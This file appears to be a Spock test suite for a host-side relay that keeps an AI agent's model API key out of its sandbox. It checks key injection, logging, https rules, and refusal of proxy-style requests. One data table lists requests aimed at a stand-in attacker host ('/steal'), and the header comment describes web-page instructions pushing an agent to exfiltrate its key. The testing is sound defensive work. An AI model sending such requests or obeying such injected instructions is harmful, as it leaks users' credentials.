package oillamp

import com.sun.net.httpserver.HttpExchange
import com.sun.net.httpserver.HttpServer
import dev.lamp.ExitStatus
import dev.lamp.LampEvent
import dev.oillamp.OilLamp
import spock.lang.Specification
import spock.lang.Subject
import spock.lang.TempDir
import spock.lang.Timeout

import java.net.StandardProtocolFamily
import java.net.UnixDomainSocketAddress
import java.nio.ByteBuffer
import java.nio.channels.Channels
import java.nio.channels.SocketChannel
import java.nio.charset.StandardCharsets
import java.nio.file.Files
import java.nio.file.Path
import java.time.Duration
import java.util.concurrent.CopyOnWriteArrayList
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 *  The model key stays on the host. The sandbox sends its model requests to oillamp with a
 *  placeholder, and oillamp sends them on to the model service with the real key.
 *
 *  <p>An agent can read everything in its sandbox, and whatever it can read it can send anywhere;
 *  a web page with the right instructions is enough to make it try. So the key is never in the
 *  sandbox, and these scenarios check the one place it is used: the relay on the host.
 *
 *  <p>The session is real apart from the container. A stand-in model service runs on this
 *  machine's loopback, configured as {@code model.service}, and the scenarios send requests into
 *  the relay's socket exactly as the relay inside the container does.
 */
@Timeout(value = 90, unit = TimeUnit.SECONDS)
class KeepingTheModelKeyOnTheHostSpec extends Specification {

    static final String KEY = 'sk-the-real-key-0123456789'

    @TempDir Path tmp
    @Subject Sandbox sandbox
    HttpServer service
    /** What the stand-in model service received, one map per request. */
    final List<Map> received = new CopyOnWriteArrayList<>()
    final List<LampEvent> reported = new CopyOnWriteArrayList<>()
    Thread session
    OilLamp.Outcome sessionOutcome

    def setup() {
        sandbox = new Sandbox(tmp)
        sandbox.machine { it.reallyRuns('ssh-keygen').windowsStayOpenFor(Duration.ofSeconds(60)) }
        service = HttpServer.create(new InetSocketAddress('127.0.0.1', 0), 0)
        service.createContext('/') { HttpExchange exchange ->
            received << [method: exchange.requestMethod, path: exchange.requestURI.toString(),
                         authorization: exchange.requestHeaders.getFirst('Authorization'),
                         host: exchange.requestHeaders.getFirst('Host'),
                         contentType: exchange.requestHeaders.getFirst('Content-Type'),
                         body: new String(exchange.requestBody.readAllBytes(), StandardCharsets.UTF_8)]
            answer(exchange)
        }
        service.start()
    }

    def cleanup() {
        if (session?.alive) {
            sandbox.oillamp.run('stop', sandbox.lampPath().toString())
            session.join(20_000)
        }
        service?.stop(0)
    }

    /** How the stand-in answers. A scenario replaces it to answer differently. */
    Closure answer = { HttpExchange exchange ->
        byte[] body = '{"choices":[{"message":{"content":"ok"}}]}'.getBytes(StandardCharsets.UTF_8)
        exchange.responseHeaders.add('Content-Type', 'application/json')
        exchange.sendResponseHeaders(200, body.length)
        exchange.responseBody.withCloseable { it.write(body) }
    }

    def 'A model request leaves with the host\'s key, never with what the sandbox sent'() {
        reportInfo """
            Inside the sandbox the harness holds only a placeholder key. oillamp takes each
            request, removes whatever key and host the sandbox put in it, adds the real key from
            the environment oillamp was started in, and sends it to the configured service. The
            path, the body and the other headers arrive unchanged, and the answer comes back to the
            sandbox as the service gave it.
        """
        given: 'a key in the environment oillamp starts from, and a session'
            sandbox.machine { it.environmentVariable('EDENAI_API_KEY', KEY) }
            startASession()

        when: 'the sandbox sends a chat request with its placeholder'
            var answer = ask(request('POST', '/v3/chat/completions', '{"model":"m","messages":[]}',
                                     'Authorization: Bearer placeholder-in-the-sandbox'))

        then: 'the service received the real key, for its own host, and the request otherwise untouched'
            received.size() == 1
            var arrived = received.first()
            arrived.method == 'POST'
            arrived.path == '/v3/chat/completions'
            arrived.authorization == "Bearer ${KEY}".toString()
            arrived.host == "127.0.0.1:${service.address.port}".toString() || arrived.host == '127.0.0.1'
            arrived.contentType == 'application/json'
            arrived.body == '{"model":"m","messages":[]}'

        and: 'the sandbox got the service\'s answer'
            answer.startsWith('HTTP/1.1 200')
            answer.endsWith('{"choices":[{"message":{"content":"ok"}}]}')
    }

    def 'The key is nowhere the sandbox can see: not in its settings, not in its home, not in its sockets'() {
        reportInfo """
            Everything the container is given comes from three places in the lamp: the session's
            settings (runtime.env and the agent guide), the agent's home, and the socket
            directories. None of them may hold the key, in any file, under any name. The session
            here really starts with a key in its environment and really writes all of these, so
            this checks the files the container would be given, not a description of them.
        """
        given:
            sandbox.machine { it.environmentVariable('EDENAI_API_KEY', KEY) }
            startASession()

        when: 'every file the container is given is read'
            var lamp = sandbox.lampPath()
            var agentHome = Files.list(lamp).filter { it.fileName.toString().startsWith('agent-lamp-') }
                                            .findFirst().orElseThrow()
            var given = [lamp.resolve('.oillamp/session'), agentHome, lamp.resolve('.oillamp/sockets'),
                         lamp.resolve('.oillamp/recordings')]
            var files = given.findAll { Files.exists(it) }.collectMany { place ->
                Files.walk(place).filter { Files.isRegularFile(it) }.toList() }

        then: 'there are files to check, including the settings and the guide'
            files.any { it.fileName.toString() == 'runtime.env' }
            files.any { it.fileName.toString() == 'AGENTS.md' }

        and: 'none of them holds the key'
            files.findAll { Files.readString(it, java.nio.charset.StandardCharsets.ISO_8859_1).contains(KEY) }.isEmpty()

        and: 'the settings do not even name it'
            !Files.readString(lamp.resolve('.oillamp/session/runtime.env')).contains('EDENAI_API_KEY')
    }

    def 'The key can come from any variable the user names, for a service the user chooses'() {
        reportInfo """
            The model service and its key are the user's choice, made on the host: a company's own
            model gateway, a second account for a particular project. `model.service` and
            `model.key_env` in the lamp's configuration say where requests go and which variable
            holds the key. The agent cannot see either setting.
        """
        given:
            sandbox.machine { it.environmentVariable('CAMPAIGN_KEY', 'sk-campaign').environmentVariable('EDENAI_API_KEY', KEY) }
            sandbox.givenConfig(sandbox.lampPath(), """
                schema_version = 1
                [model]
                service = "http://127.0.0.1:${service.address.port}"
                key_env = "CAMPAIGN_KEY"
            """.stripIndent())
            startASession(false)

        when:
            ask(request('GET', '/v3/models', '', 'Authorization: Bearer placeholder'))

        then:
            received.first().authorization == 'Bearer sk-campaign'
    }

    def 'The command line can name another service and key variable, for this one session'() {
        reportInfo """
            An application that starts oillamp for its own users has its own settings screen: the
            user types in a service and a key there, not into the lamp's configuration file. So
            `oillamp at` takes `--model-service` and `--model-key-env`, which replace the lamp's
            `[model]` settings for this session and leave the file alone. The key itself is never
            an argument, because every user of the machine can read a process's arguments: the
            option names the variable that holds it.
        """
        given: 'a lamp configured for one service and key, and another key in the environment'
            sandbox.machine { it.environmentVariable('APP_MODEL_KEY', 'sk-from-the-app').environmentVariable('EDENAI_API_KEY', KEY) }
            sandbox.givenConfig(sandbox.lampPath(), '''
                schema_version = 1
                [model]
                service = "https://api.eu.edenai.run"
            '''.stripIndent())

        when: 'the session is started with the other service and the other key'
            startASession(false, '--model-service', "http://127.0.0.1:${service.address.port}".toString(),
                          '--model-key-env=APP_MODEL_KEY')
            ask(request('GET', '/v3/models', '', 'Authorization: Bearer placeholder'))

        then: 'the request went to the service from the command line, with the key it named'
            received.size() == 1
            received.first().authorization == 'Bearer sk-from-the-app'

        and: 'the lamp\'s own configuration is unchanged'
            Files.readString(sandbox.lampPath().resolve('oillamp.toml')).contains('https://api.eu.edenai.run')
    }

    def 'A service or key variable on the command line is checked like the one in the file'() {
        reportInfo """
            The same rules as for `model.service` and `model.key_env`: the key is sent to the
            service, so it must be https unless it runs on this machine, and the variable must be
            a name, not a key. A mistake is a usage error before anything starts.
        """
        when:
            var outcome = sandbox.oillamp.run(['at', sandbox.lampPath().toString(), *given] as String[])

        then:
            outcome.status() == ExitStatus.USAGE
            outcome.console().contains(complaint)
            !Files.exists(sandbox.lampPath())

        where:
            given                                                || complaint
            ['--model-service', 'http://api.eu.edenai.run']      || 'must be https://'
            ['--model-service=https://api.eu.edenai.run/v3']     || 'expected just a scheme, a host'
            ['--model-key-env', 'sk-a-key-by-mistake']           || 'expected the name of an environment variable'
            ['--model-service']                                  || '--model-service needs a value'
    }

    def 'Without a key, the request is refused with an explanation, and nothing reaches the service'() {
        reportInfo """
            A session started without the key in its environment still starts: the agent can do
            everything except use the model. When its harness tries, the answer says exactly what
            to do, so the user does not go looking for a network problem. The user's terminal is
            told too.
        """
        given: 'no key anywhere'
            startASession()

        when:
            var answer = ask(request('POST', '/v3/chat/completions', '{}', 'Authorization: Bearer placeholder'))

        then: 'the harness is told why, in words that say what to do'
            answer.startsWith('HTTP/1.1 401')
            answer.contains('set EDENAI_API_KEY in the environment oillamp is started from')

        and: 'nothing was sent to the service'
            received.isEmpty()

        and: 'the terminal oillamp runs in says so'
            waitUntil { reported.any { it instanceof LampEvent.Info && it.area() == 'network'
                                       && it.text().contains('no model key') } }
    }

    def 'The answer streams back to the sandbox as it is produced, not when it is complete'() {
        reportInfo """
            Harnesses show a model's answer as it is written, word by word, and a long answer can
            take a minute. A relay that waited for the whole answer before passing it on would
            freeze the harness for that minute. Here the service sends the first part of its
            answer and then waits until the sandbox has received it before sending the rest, which
            only works if nothing in between holds the first part back.
        """
        given: 'a service that answers in two parts, the second only after the first arrived'
            var firstArrived = new CountDownLatch(1)
            answer = { HttpExchange exchange ->
                exchange.sendResponseHeaders(200, 0)
                exchange.responseBody.write('data: first\n\n'.bytes)
                exchange.responseBody.flush()
                firstArrived.await(20, TimeUnit.SECONDS)
                exchange.responseBody.write('data: second\n\n'.bytes)
                exchange.responseBody.close()
            }
            sandbox.machine { it.environmentVariable('EDENAI_API_KEY', KEY) }
            startASession()

        when:
            var channel = SocketChannel.open(UnixDomainSocketAddress.of(modelSocket()))
            channel.write(ByteBuffer.wrap(request('POST', '/v3/chat/completions', '{"stream":true}',
                                                  'Authorization: Bearer placeholder').getBytes(StandardCharsets.UTF_8)))
            var input = Channels.newInputStream(channel)
            var soFar = new StringBuilder()
            while (!soFar.toString().contains('data: first')) soFar.append((char) input.read())
            firstArrived.countDown()
            soFar.append(new String(input.readAllBytes(), StandardCharsets.ISO_8859_1))
            channel.close()

        then: 'the first part arrived on its own, and the second followed'
            soFar.toString().contains('data: second')
    }

    def 'Only a plain request for a path is relayed; nothing can send the key somewhere else'() {
        reportInfo """
            The relay decides where a request goes. A request that names a host of its own, as a
            proxy request does, or asks for a tunnel, could otherwise try to take the key along
            to that host. Such requests are refused before anything is sent.
        """
        given:
            sandbox.machine { it.environmentVariable('EDENAI_API_KEY', KEY) }
            startASession()

        when:
            var answer = ask(line)

        then:
            answer.startsWith('HTTP/1.1 400')
            received.isEmpty()

        where:
            line << ['CONNECT evil.example.com:443 HTTP/1.1\r\nHost: evil.example.com\r\n\r\n',
                     'GET http://evil.example.com/steal HTTP/1.1\r\nHost: evil.example.com\r\n\r\n',
                     'GET https://evil.example.com/steal HTTP/1.1\r\n\r\n',
                     'GET /v3/models HTTP/1.1\r\nno header name here\r\n\r\n']
    }

    def 'Every model request is in the network log, and the key is not'() {
        reportInfo """
            The network log is how a user sees what the agent did. Model requests belong in it:
            when, which path, how much went each way. The key does not: a log is read, copied and
            attached to bug reports.
        """
        given:
            sandbox.machine { it.environmentVariable('EDENAI_API_KEY', KEY) }
            startASession()

        when:
            ask(request('POST', '/v3/chat/completions', '{}', 'Authorization: Bearer placeholder'))
            sandbox.oillamp.run('stop', sandbox.lampPath().toString())
            session.join(20_000)

        then:
            var logs = Files.list(sandbox.lampPath().resolve('.oillamp/logs')).toList()
            var text = logs.collect { Files.readString(it) }.join('\n')
            text.contains('"channel":"model"')
            !text.contains(KEY)
    }

    def 'The model service must be reached over https, unless it runs on this machine'() {
        reportInfo """
            The key travels with every request to the model service. Over plain http, anyone on
            the network path could read it. So oillamp refuses an http:// service unless it is on
            this machine's own loopback, where there is no network path. It also refuses a
            service address with a path or query in it: the harnesses choose the path.
        """
        given:
            sandbox.givenConfig(sandbox.lampPath(), """
                schema_version = 1
                [model]
                service = "${address}"
            """.stripIndent())

        when:
            var outcome = sandbox.oillamp.run('config', sandbox.lampPath().toString(), 'check')

        then:
            outcome.reported('OIL-CONFIG-004') != accepted

        where:
            address                                  || accepted
            'https://api.eu.edenai.run'               || true
            'https://llm.corp.example.com:8443'       || true
            'http://127.0.0.1:8080'                   || true
            'http://localhost:8080'                   || true
            'http://api.eu.edenai.run'                || false
            'http://192.168.1.20:8080'                || false
            'https://api.eu.edenai.run/v3'            || false
            'https://api.eu.edenai.run?key=x'         || false
            'ftp://api.eu.edenai.run'                 || false
            'not an address'                          || false
    }

    // ─── helpers ───────────────────────────────────────────────────────────────────────────

    /** Starts a session, with the stand-in as its model service unless the lamp configures one. */
    private void startASession(boolean configureService = true, String... options) {
        if (configureService)
            sandbox.givenConfig(sandbox.lampPath(), """
                schema_version = 1
                [model]
                service = "http://127.0.0.1:${service.address.port}"
            """.stripIndent())
        var oillamp = sandbox.oillamp.observedBy { reported.add(it) }
        session = Thread.start { sessionOutcome = oillamp.run(['at', sandbox.lampPath().toString(), *options] as String[]) }
        waitUntil { reported.any { it instanceof LampEvent.Summary && it.title() == 'your session is up' } }
    }

    /** The relay's socket, reached the way the host reaches it: through the short runtime path. */
    private Path modelSocket() {
        try (var lamps = Files.list(sandbox.runtime.resolve('oillamp'))) {
            lamps.findFirst().orElseThrow().resolve('sockets/host/model.sock')
        }
    }

    private static String request(String method, String path, String body, String... headers) {
        byte[] bytes = body.getBytes(StandardCharsets.UTF_8)
        "${method} ${path} HTTP/1.1\r\nHost: 127.0.0.1:3129\r\nContent-Type: application/json\r\n" +
        headers.collect { it + '\r\n' }.join('') +
        "Content-Length: ${bytes.length}\r\n\r\n${body}"
    }

    /** Sends one request as the sandbox would, and returns everything that comes back. */
    private String ask(String request) {
        var channel = SocketChannel.open(StandardProtocolFamily.UNIX)
        channel.connect(UnixDomainSocketAddress.of(modelSocket()))
        channel.write(ByteBuffer.wrap(request.getBytes(StandardCharsets.UTF_8)))
        var answer = new String(Channels.newInputStream(channel).readAllBytes(), StandardCharsets.UTF_8)
        channel.close()
        answer
    }

    private static void waitUntil(Closure<Boolean> condition) {
        var deadline = System.currentTimeMillis() + 30_000
        while (System.currentTimeMillis() < deadline) {
            if (condition()) return
            Thread.sleep(50)
        }
        throw new AssertionError("never happened: ${condition}" as Object)
    }
}
